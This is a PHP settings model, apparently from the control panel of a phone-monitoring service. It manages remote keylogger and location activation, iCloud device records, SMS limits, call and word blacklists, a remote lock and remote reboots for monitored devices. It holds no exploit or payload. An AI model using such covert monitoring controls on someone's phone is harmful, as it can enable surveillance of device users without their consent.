<?php

namespace Models\Cp;

use CS\Devices\DeviceOptions;

class Settings extends BaseModel {

    public static $networksList = array(
        'wifi' => 'Wi-Fi only',
        'any' => 'Wi-Fi and Mobile Network'
    );
    public static $networkFeatures = array(
        'photos' => 'photos_network',
        'videos' => 'video_network'
    );

    public function setNetwork($devId, $feature, $net)
    {
        if (!isset(self::$networkFeatures[$feature])) {
            throw new \Exception('Invalid feature');
        }

        if ($net !== 'any' && $net !== 'wifi') {
            throw new DevicesInvalidNetworkException();
        }

        $column = self::$networkFeatures[$feature];
        $devId = $this->getDB()->quote($devId);
        $net = $this->getDB()->quote($net);

        $this->getDb()->exec("UPDATE `dev_settings` SET `{$column}` = {$net} WHERE `dev_id` = {$devId}");
    }

    public function getNetwork($devId, $feature)
    {
        if (!isset(self::$networkFeatures[$feature])) {
            throw new \Exception('Invalid feature');
        }

        $column = self::$networkFeatures[$feature];
        $devId = $this->getDB()->quote($devId);

        return $this->getDb()->query("SELECT `{$column}` FROM `dev_settings` WHERE `dev_id` = {$devId} LIMIT 1")->fetchColumn();
    }

    public function addBlackListPhone($devId, $phone)
    {
        $preparedPhone = str_replace(',', '', trim($phone));

        if (!validatePhoneNumber($preparedPhone)) {
            throw new Settings\InvalidPhoneNumberException();
        }

        if (($blackString = $this->getPhoneBlackListString($devId)) === false) {
            throw new Settings\SettingsNotFoundException("Device black phones list not found");
        }

        $list = $this->buildBlackList($blackString);

        if (in_array($preparedPhone, $list)) {
            throw new Settings\PhoneNumberExistException();
        }

        array_push($list, $preparedPhone);

        $newString = $this->blackListToString($list);

        return $this->setPhonesBlackListString($devId, $newString);
    }

    public function addBadWord($devId, $word)
    {
        $preparedWord = str_replace(',', '', trim($word));

        if (!strlen($preparedWord)) {
            throw new Settings\InvalidBadWordException();
        }

        if (($blackString = $this->getWordBlackListString($devId)) === false) {
            throw new Settings\SettingsNotFoundException("Device bad word list not found");
        }

        $list = $this->buildBlackList($blackString);

        if (in_array($preparedWord, $list)) {
            throw new Settings\BadWordExistException();
        }

        array_push($list, $preparedWord);

        $newString = $this->blackListToString($list);

        return $this->setWordsBlackListString($devId, $newString);
    }

    public function removeBlackListPhone($devId, $phone)
    {
        if (($blackString = $this->getPhoneBlackListString($devId)) === false) {
            throw new Settings\SettingsNotFoundException("Device black phones list not found");
        }

        $list = $this->buildBlackList($blackString);

        if (($key = array_search($phone, $list)) === false) {
            throw new Settings\PhoneNumberNotFoundInListException();
        }

        unset($list[$key]);
        $value = $this->blackListToString($list);

        return $this->setPhonesBlackListString($devId, $value);
    }

    public function removeBlackListWord($devId, $word)
    {
        if (($blackString = $this->getWordBlackListString($devId)) === false) {
            throw new Settings\SettingsNotFoundException("Device black words list not found");
        }

        $list = $this->buildBlackList($blackString);

        if (($key = array_search($word, $list)) === false) {
            throw new Settings\BadWordNotFoundInListException();
        }

        unset($list[$key]);
        $value = $this->blackListToString($list);

        return $this->setWordsBlackListString($devId, $value);
    }

    public function setSimChangeNotifications($devId, $simNotifications)
    {
        $escapedDevId = $this->getDB()->quote($devId);
        $escapedSimNotifications = $this->getDB()->quote($simNotifications);

        return $this->getDb()->exec("UPDATE 
                                            `dev_settings`
                                        SET 
                                            `sim_notification` = {$escapedSimNotifications}
                                        WHERE
                                            `dev_id` = {$escapedDevId}");
    }

    public function setSmsSettings($devId, $outgoingLimitation, $outgoingLimitationCount, $outgoingLimitationAlert, $outgoingLimitationMessage)
    {

        if ($outgoingLimitationAlert && !strlen($outgoingLimitationMessage)) {
            throw new Settings\InvalidSmsLimitationMessageException("Bad alert message!");
        }

        $escapedDevId = $this->getDB()->quote($devId);
        $outgoingLimitation = $this->getDB()->quote($outgoingLimitation);
        $outgoingLimitationCount = $this->getDB()->quote($outgoingLimitationCount);
        $outgoingLimitationAlert = $this->getDB()->quote($outgoingLimitationAlert);
        $outgoingLimitationMessage = $this->getDB()->quote($outgoingLimitationMessage);

        return $this->getDb()->exec("UPDATE 
                                            `dev_settings`
                                        SET 
                                            `outgoing_sms_limitation` = {$outgoingLimitation},
                                            `outgoing_sms_limitation_count` = {$outgoingLimitationCount},
                                            `outgoing_sms_limitation_alert` = {$outgoingLimitationAlert},
                                            `outgoing_sms_limitation_message` = {$outgoingLimitationMessage}
                                        WHERE
                                            `dev_id` = {$escapedDevId}");
    }

    public function lockDevice($devId, $password)
    {
        if (!preg_match('/^[0-9]{4}$/', $password)) {
            throw new Settings\InvalidPasswordException();
        }

        return $this->setDeviceLockPassword($devId, $password);
    }

    public function setDeviceLockPassword($devId, $password)
    {
        $escapedDevId = $this->getDB()->quote($devId);
        $escapedPassword = intval($password);

        return $this->getDb()->exec("UPDATE `dev_settings` SET `lock_phone` = {$escapedPassword} WHERE `dev_id` = {$escapedDevId} LIMIT 1");
    }

    public function getPhoneBlackListString($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);

        return $this->getDb()->query("SELECT `bl_phones` FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetchColumn();
    }

    public function getWordBlackListString($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);

        return $this->getDb()->query("SELECT `bl_words` FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetchColumn();
    }

    public function setRebootDevice($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);

        return $this->getDb()->exec("UPDATE `dev_settings` SET `reboot_dev` = 1 WHERE `dev_id` = {$escapedDevId} LIMIT 1");
    }

    public function setRebootApp($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);

        return $this->getDb()->exec("UPDATE `dev_settings` SET `reboot_app` = 1 WHERE `dev_id` = {$escapedDevId} LIMIT 1");
    }

    public function setPhonesBlackListString($devId, $value)
    {
        $escapedDevId = $this->getDB()->quote($devId);
        $escapedValue = $this->getDB()->quote($value);

        return $this->getDb()->exec("UPDATE `dev_settings` SET `bl_phones` = {$escapedValue} WHERE `dev_id` = {$escapedDevId} LIMIT 1");
    }

    public function setWordsBlackListString($devId, $value)
    {
        $escapedDevId = $this->getDB()->quote($devId);
        $escapedValue = $this->getDB()->quote($value);

        return $this->getDb()->exec("UPDATE `dev_settings` SET `bl_words` = {$escapedValue} WHERE `dev_id` = {$escapedDevId} LIMIT 1");
    }

    protected function rebuildBlackWordsList($string)
    {
        $replacedString = str_replace(array(", ", " ", ",", "\r\n", "\n", "\r"), ",", $string);
        $wordsList = array_unique(explode(",", $replacedString));
        foreach ($wordsList as $key => $value) {
            if (strlen($value) == 0) {
                unset($wordsList[$key]);
                break;
            }
        }
        return implode(",", $wordsList);
    }

    protected function buildBlackList($string)
    {
        $array = explode(',', $string);

        foreach ($array as $key => $value) {
            if (!strlen($value)) {
                unset($array[$key]);
            }
        }

        return $array;
    }

    protected function blackListToString($list)
    {
        return implode(',', $list);
    }

    public function getDeviceSettings($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);

        return $this->getDb()->query("SELECT * FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch();
    }

    public function getKeyloggerEnabled($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);
        return $this->getDb()->query("SELECT `keylogger_enabled` FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch();
    }

    public function getLocationServiceEnabled($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);
        return $this->getDb()->query("SELECT `location_service_enabled` FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch();
    }

    public function activateKeylogger($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);

        $this->getDb()->exec("UPDATE `dev_settings` SET `keylogger_activate` = 1 WHERE `dev_id` = {$escapedDevId} LIMIT 1");
    }

    public function activateLocation($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);
        $this->getDb()->exec("UPDATE `dev_settings` SET `location_service_enabled` = 1 WHERE `dev_id` = {$escapedDevId} LIMIT 1");
    }

    public function getDeviceInfo($devId)
    {
        $escapedDevId = $this->getDB()->quote($devId);
        return $this->getDb()->query("SELECT * FROM `dev_info` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch(\PDO::FETCH_ASSOC);
    }

    public function getCarrierNameByCode($code)
    {
        $mainDb = $this->di->get('db');
        $escapedCode = $mainDb->quote($code);

        return $mainDb->query("SELECT `network` FROM `mcc_mnc_codes` WHERE `code` = {$escapedCode} LIMIT 1")->fetchColumn();
    }

    public static function formatBytes($bytes, $precision = 2)
    {
        $base = log($bytes, 1024);
        $suffixes = array('', 'kB', 'MB', 'GB', 'TB');

        return round(pow(1024, $base - floor($base)), $precision) . ' ' . $suffixes[floor($base)];
    }

    public function getCloudDeviceInfo($deviceId)
    {
        $mainDb = $this->di->get('db');
        $deviceId = $mainDb->quote($deviceId);

        return $mainDb->query("SELECT * FROM `devices_icloud` WHERE `dev_id` = {$deviceId} LIMIT 1")->fetch(\PDO::FETCH_ASSOC);
    }

    public function getSettings($devId)
    {
        $devInfo = $this->di['currentDevice'];

        if (($settings = $this->getDeviceSettings($devId)) === false) {
            throw new Settings\SettingsNotFoundException("Device settings not found");
        }

        if (($info = $this->getDeviceInfo($devId)) === false) {
            throw new Settings\SettingsNotFoundException("Device info not found");
        }

        $info['internalStorage'] = ($info['int_storage_total'] && $info['int_storage_free']) ? [
            'total' => $info['int_storage_total'] ? self::formatBytes($info['int_storage_total']) : null,
            'free' => $info['int_storage_free'] ? self::formatBytes($info['int_storage_total'] - $info['int_storage_free']) : null,
                ] : null;

        $info['externalStorage'] = ($info['ext_storage_total'] && $info['ext_storage_free']) ? [
            'total' => $info['ext_storage_total'] ? self::formatBytes($info['ext_storage_total']) : null,
            'free' => $info['ext_storage_free'] ? self::formatBytes($info['ext_storage_total'] - $info['ext_storage_free']) : null,
                ] : null;

        $carrierParts = explode('_', $info['carrier']);

        if (isset($carrierParts[0]) && strlen($carrierParts[0]) && ($carrierParts[0] != '(null)' || strtolower($carrierParts[0]) != 'carrier')) {
            $info['carrier'] = $carrierParts[0];
        } else {
            $code = isset($carrierParts[1]) ? $carrierParts[1] : 0;

            $name = $this->getCarrierNameByCode($code);
            if ($name !== false) {
                $info['carrier'] = $name;
            } else {
                $info['carrier'] = null;
            }
        }

        return array(
            'settings' => $settings,
            'info' => $info,
            'blackListPhones' => $this->buildBlackList($settings['bl_phones']),
            'blackListWords' => $this->buildBlackList($settings['bl_words']),
            'lockActive' => DeviceOptions::isLockActive($devInfo['os'], $devInfo['os_version']),
            'blockSMSActive' => DeviceOptions::isBlockSMSActive($devInfo['os'], $devInfo['os_version']),
            'rebootApplicationActive' => DeviceOptions::isRebootApplicationActive($devInfo['os']),
            'rebootDeviceActive' => DeviceOptions::isRebootDeviceActive($devInfo['os']),
            'isBlackListAvailable' => DeviceOptions::isBlackListAvailable($devInfo['os']),
            'isSimNotificationAvailable' => DeviceOptions::isSimNotificationAvailable($devInfo['os']),
            'isDeviceCommandsAvailable' => DeviceOptions::isDeviceCommandsAvailable($devInfo['os']),
            'isOutgoingSmsLimitationsAvailable' => DeviceOptions::isOutgoingSmsLimitationsAvailable($devInfo['os']),
            'isOutgoingSmsLimitationsActive' => DeviceOptions::isOutgoingSmsLimitationsActive($devInfo['os'], $settings['keylogger_enabled'])
        );
    }

}
